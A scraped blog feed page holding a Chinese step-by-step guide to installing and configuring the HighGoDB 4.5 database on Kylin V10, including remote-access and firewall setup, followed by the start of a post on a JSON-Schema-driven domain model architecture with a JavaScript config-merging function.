                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 环境准备</h2>
<p>操作系统：银河麒麟 V10
数据库版本：HighGoDB 4.5（瀚高数据库，兼容 PostgreSQL）
安装文件：hgdb-4.5-e94b212-20250227.x86_64.rpm
将安装包上传至服务器（本文目录：/home）。</p>
<h2 data-id="heading-1">2. 安装数据库</h2>
<p>进入安装包目录，执行安装命令,安装完成后，会自动在 systemd 中注册服务：</p>
<pre><code class="hljs language-perl" lang="perl">[root@localhost home]<span class="hljs-comment"># rpm -ivh hgdb-4.5-e94b212-20250227.x86_64.rpm </span>
Verifying...                          <span class="hljs-comment">################################# [100%]</span>
准备中...                          <span class="hljs-comment">################################# [100%]</span>
正在升级/安装...
   <span class="hljs-number">1</span>:hgdb-<span class="hljs-number">4.5</span>-e94b212                 <span class="hljs-comment">################################# [100%]</span>
Created <span class="hljs-keyword">symlink</span> /etc/systemd/<span class="hljs-keyword">system</span>/multi-user.target.wants/hgdb-<span class="hljs-number">4.5</span>.service → /usr/lib/systemd/<span class="hljs-keyword">system</span>/hgdb-<span class="hljs-number">4.5</span>.service.
Created <span class="hljs-keyword">symlink</span> /etc/systemd/<span class="hljs-keyword">system</span>/graphical.target.wants/hgdb-<span class="hljs-number">4.5</span>.service → /usr/lib/systemd/<span class="hljs-keyword">system</span>/hgdb-<span class="hljs-number">4.5</span>.service.
</code></pre>
<p>UOS Server 20安装命令：<code>yum install hgdb-4.5-29a3ba5-20250619.x86_64.rpm</code></p>
<p>默认安装目录为：</p>
<pre><code class="hljs language-bash" lang="bash">/opt/highgo/hgdb-4.5/
</code></pre>
<h2 data-id="heading-2">3. 初始化数据库</h2>
<p>进入 <code>bin</code> 目录，执行初始化命令：</p>
<pre><code class="hljs language-sql" lang="sql">[root<span class="hljs-variable">@localhost</span> <span class="hljs-operator">~</span>]# cd <span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>highgo<span class="hljs-operator">/</span>hgdb<span class="hljs-number">-4.5</span><span class="hljs-operator">/</span>bin
[root<span class="hljs-variable">@localhost</span> bin]# .<span class="hljs-operator">/</span>initdb <span class="hljs-operator">-</span>D ..<span class="hljs-operator">/</span>data <span class="hljs-operator">-</span>A scram<span class="hljs-operator">-</span>sha<span class="hljs-number">-256</span> <span class="hljs-operator">&gt;</span> <span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>highgo<span class="hljs-operator">/</span>hgdb<span class="hljs-number">-4.5</span><span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>initdb.log
initdb: could <span class="hljs-keyword">not</span> find suitable text <span class="hljs-keyword">search</span> configuration <span class="hljs-keyword">for</span> locale "zh_CN.UTF-8"
Enter <span class="hljs-keyword">new</span> sysdba password: 
再输入一遍: 
Enter <span class="hljs-keyword">new</span> syssao password: 
再输入一遍: 
Enter <span class="hljs-keyword">new</span> syssso password: 
再输入一遍: 
<span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">09</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15.770</span> CST [<span class="hljs-number">16233</span>] 日志:  Switchover the SSHA Role. <span class="hljs-keyword">Current</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">NONE</span>
<span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">09</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15.839</span> CST [<span class="hljs-number">16235</span>] 日志:  Switchover the SSHA Role. <span class="hljs-keyword">Current</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">NONE</span>
</code></pre>
<p>初始化时会要求设置 三类用户密码：</p>
<ul>
<li>sysdba（系统管理员）</li>
<li>syssao（安全保密管理员）</li>
<li>syssso（安全审计员）
完成后执行 SSL 证书生成：</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@localhost bin</span>]<span class="hljs-meta"># ./hg_sslkeygen.sh /opt/highgo/hgdb-4.5/data</span>
Setting the ssl configuration to /opt/highgo/hgdb<span class="hljs-number">-4.5</span>/data
Generating RSA <span class="hljs-keyword">private</span> key, <span class="hljs-number">2048</span> <span class="hljs-function">bit <span class="hljs-built_in">long</span> <span class="hljs-title">modulus</span> (<span class="hljs-params"><span class="hljs-number">2</span> primes</span>)
................................................................+++++
...+++++
e <span class="hljs-keyword">is</span> 65537 (<span class="hljs-params"><span class="hljs-number">0x010001</span></span>)
</span></code></pre>
<h2 data-id="heading-3">4. 配置环境变量</h2>
<p>进入 etc 目录，拷贝环境变量模板：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@localhost bin</span>]<span class="hljs-meta"># cd /opt/highgo/hgdb-4.5/etc</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># cp hgdbenv.sample hgdb.env</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># vim hgdb.env 		# 根据自己的需求修改</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># source hgdb.env		# 加载环境变量</span>
[<span class="hljs-meta">root@localhost etc</span>]<span class="hljs-meta"># echo $HGDB_HOME		# 测试环境变量</span>
</code></pre>
<h2 data-id="heading-4">5、配置IP访问</h2>
<pre><code class="hljs language-sql" lang="sql">[root<span class="hljs-variable">@localhost</span> etc]# systemctl <span class="hljs-keyword">start</span> hgdb<span class="hljs-number">-4.5</span>.service		# 启动服务
[root<span class="hljs-variable">@localhost</span> etc]# psql <span class="hljs-operator">-</span>d highgo <span class="hljs-operator">-</span>U sysdba				# 连接数据库
用户 sysdba 的口令：
注意:  
<span class="hljs-comment">-------------------------------------------</span>
Login <span class="hljs-keyword">User</span>: sysdba 
Login <span class="hljs-type">time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-20</span> <span class="hljs-number">10</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31.795855</span><span class="hljs-operator">+</span><span class="hljs-number">08</span> 
Login Address: [<span class="hljs-keyword">local</span>] 
<span class="hljs-keyword">Last</span> Login Status: SUCCESS 
Login Failures: <span class="hljs-number">0</span> 
Valied Until: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-27</span> <span class="hljs-number">09</span>:<span class="hljs-number">59</span>:<span class="hljs-number">15</span><span class="hljs-operator">+</span><span class="hljs-number">08</span> 
<span class="hljs-comment">-------------------------------------------</span>

psql (<span class="hljs-number">4.5</span>)
输入 "help" 来获取帮助信息.

highgo<span class="hljs-operator">=</span># <span class="hljs-keyword">show</span> listen_addresses;			# 查看监听地址
 listen_addresses 
<span class="hljs-comment">------------------</span>
 localhost
(<span class="hljs-number">1</span> 行记录)

highgo<span class="hljs-operator">=</span># <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">set</span> listen_addresses <span class="hljs-operator">=</span> <span class="hljs-string">'*'</span>;	# 修改监听地址
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span>
highgo<span class="hljs-operator">=</span># exit;
[root<span class="hljs-variable">@localhost</span> etc]#
[root<span class="hljs-variable">@localhost</span> <span class="hljs-operator">/</span>]# vim <span class="hljs-operator">/</span>opt<span class="hljs-operator">/</span>highgo<span class="hljs-operator">/</span>hgdb<span class="hljs-number">-4.5</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>pg_hba.conf		# 修改 pg_hba.conf
# 新增一行，允许所有 IP 连接：
host    <span class="hljs-keyword">all</span>    <span class="hljs-keyword">all</span>    <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>    scram<span class="hljs-operator">-</span>sha<span class="hljs-number">-256</span>
</code></pre>
<p>重启数据库
<code>systemctl restart hgdb-4.5.service</code></p>
<h2 data-id="heading-5">6. 开放防火墙端口</h2>
<p>瀚高数据库默认端口是 5866，需要在防火墙放行：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 永久放行 5866 端口</span>
firewall-cmd <span class="hljs-attr">--zone</span>=public --add-port=<span class="hljs-number">5866</span>/tcp --permanent

<span class="hljs-comment"># 重新加载防火墙配置</span>
firewall-cmd --reload

<span class="hljs-comment"># 查看端口是否已开放</span>
firewall-cmd <span class="hljs-attr">--zone</span>=public --list-ports
</code></pre>
<h2 data-id="heading-6">7. 验证远程连接</h2>
<p>在客户端使用 psql 或 Navicat / DBeaver 等工具连接：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">host:</span> <span class="hljs-string">服务器IP</span>
<span class="hljs-attr">port:</span> <span class="hljs-number">5866</span>
<span class="hljs-attr">database:</span> <span class="hljs-string">highgo</span>
<span class="hljs-attr">username:</span> <span class="hljs-string">sysdba</span>
<span class="hljs-attr">password:</span> <span class="hljs-string">初始化时设置的密码</span>
</code></pre>
<h2 data-id="heading-7">8. 更新瀚高数据库lic</h2>
<pre><code class="hljs language-bash" lang="bash">/opt/highgo/hgdb-4.5/bin/hg_lic -l -P /opt/highgo/hgdb-4.5 -F /opt/highgo/hgdb-4.5/data/hgdb.lic
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Elpis 第三阶段· 领域模型架构建设]]></title>    <link>https://juejin.cn/post/7583980250734444607</link>    <guid>https://juejin.cn/post/7583980250734444607</guid>    <pubDate>2025-12-16T05:01:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583980250734444607" data-draft-id="7583912899389554731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Elpis 第三阶段· 领域模型架构建设"/> <meta itemprop="keywords" content="后端,前端"/> <meta itemprop="datePublished" content="2025-12-16T05:01:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一念之间lq"/> <meta itemprop="url" content="https://juejin.cn/user/2541726616524583"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Elpis 第三阶段· 领域模型架构建设
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2541726616524583/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一念之间lq
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T05:01:37.000Z" title="Tue Dec 16 2025 05:01:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.概述</h2>
<p>在Elpis项目领域模型架构主要是以基于 <strong>JSON Schema</strong> 的 DSL（领域特定语言）数据配置驱动页面渲染的架构。我们以一套标准项目提取出公共的<code>Model</code>配置结合可全自定义化的<code>Project</code>配置继承合并成独立完整项目的<code>JSON Schema</code>配置文件,结合<code>dashboard</code> 模板引擎解析最终生成我们需要的中后台项目。基于这样的<code>DSL配置化</code>领域模型架构下将80%业务逻辑沉淀,提高开发效率。</p>
<h2 data-id="heading-1">2.领域模型架构</h2>
<h3 data-id="heading-2">1.领域模型架构设计</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b36d22e26ed479d9c30d65652d76fdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5b-15LmL6Ze0bHE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766466449&amp;x-signature=bTiDwSzjBD6WSg0WuBfetw2FGC8%3D" alt="ScreenShot_2025-12-16_090523_054.png" loading="lazy"/></p>
<h3 data-id="heading-3">2.领域模型架构流程</h3>
<h4 data-id="heading-4">1.项目DSL配置文件生成</h4>
<p>通过<code>Model</code>基础配置与各个<code>Project</code>独立项目配置合并,形成各个项目完整的项目配置内容,并且在<code>BFF Server</code>层提供Api 获取配置项供给前端使用。</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">//`Model`基础配置与各个`Project`独立项目配置合并继承</span>
<span class="hljs-keyword">const</span> _ = <span class="hljs-built_in">require</span>(<span class="hljs-string">'lodash'</span>);

<span class="hljs-comment">// project 继承 model</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">projectExtendModel</span> = (<span class="hljs-params">model, project</span>) =&gt; {
    <span class="hljs-keyword">return</span> _.<span class="hljs-title function_">mergeWith</span>({}, model, project, <span class="hljs-function">(<span class="hljs-params">modelValue, projValue</span>) =&gt;</span> {
        <span class="hljs-comment">//处理数组合并的特殊情况</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(modelValue) &amp;&amp; <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(projValue)) {
            <span class="hljs-keyword">let</span> result = []

            <span class="hljs-comment">//因为 project 继承model,所以需要修改和新增内容的情况</span>
            <span class="hljs-comment">//project 有的键值,model也有 =&gt; 修改(重载)</span>
            <span class="hljs-comment">//project 有的键值,model没有 =&gt; 新增 拓展)</span>
            <span class="hljs-comment">//model 有的键值,project没有 =&gt; 保留(继承)</span>

            <span class="hljs-comment">//处理修改和保留</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; modelValue.<span class="hljs-property">length</span>; i++) {
                <span class="hljs-keyword">let</span> modelItem = modelValue[i]
                <span class="hljs-keyword">const</span> projItem = projValue.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">projItem</span> =&gt;</span> projItem.<span class="hljs-property">key</span> === modelItem.<span class="hljs-property">key</span>)
                <span class="hljs-comment">// project有的键值,model也有,则递归调用 projectExtendModel 方法覆盖修改</span>
                result.<span class="hljs-title function_">push</span>(projItem ? <span class="hljs-title function_">projectExtendModel</span>(modelItem, projItem) : modelItem)
            }
            <span class="hljs-comment">//处理新增</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; projValue.<span class="hljs-property">length</span>; i++) {
                <span class="hljs-keyword">let</span> projItem = projValue[i]
                <span class="hljs-keyword">const</span> modelItem = modelValue.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">modelItem</span> =&gt;</span> modelItem.<span class="hljs-property">key</span> === projItem.<span class="hljs-property">key</span>)
                <span class="hljs-keyword">if</span> (!modelItem) {
                    result.<span class="hljs-title function_">push</span>(projItem)
                }
            }
            <span class="hljs-keyword">return</span> result
        }
    });
}
</code></pre>
<h4 data-id="heading-5">2. Dashboard 模板引擎搭建</h4>
<p>先了解下DSL中<code>JSON Schema</code>配置文件字段以便于好了解Dashboard 模板引擎是如何进行解析</p>
<pre><code class="hljs language-JavaScript" lang="JavaScript">{
    <span class="hljs-attr">model</span>: <span class="hljs-string">'Dashboard'</span>,<span class="hljs-comment">//模版类型,不同模版类型对应不一样的模版数据结构</span>
    <span class="hljs-attr">name</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//模版名称</span>
    <span class="hljs-attr">desc</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//模版描述</span>
    <span class="hljs-attr">icon</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//模版图标</span>
    <span class="hljs-attr">homePage</span>: <span class="hljs-string">""</span>,<span class="hljs-comment">//首页路径(项目配置)</span>
    <span class="hljs-comment">//头部菜单</span>
    <span class="hljs-attr">menu</span>: [{
        <span class="hljs-attr">key</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//菜单key,唯一标识</span>
        <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//菜单名称</span>
        <span class="hljs-attr">menuType</span>: <span class="hljs-string">''</span>,<span class="hljs-comment">//菜单类型,枚举值,group / module</span>

        <span class="hljs-comment">// 当menuType == group 可填,展示子菜单</span>
        <span class="hljs-attr">subMenu</span>: [{
            <span class="hljs-comment">//可递归menuItem,{ key,name,menuType... } </span>
        }, ...]
        
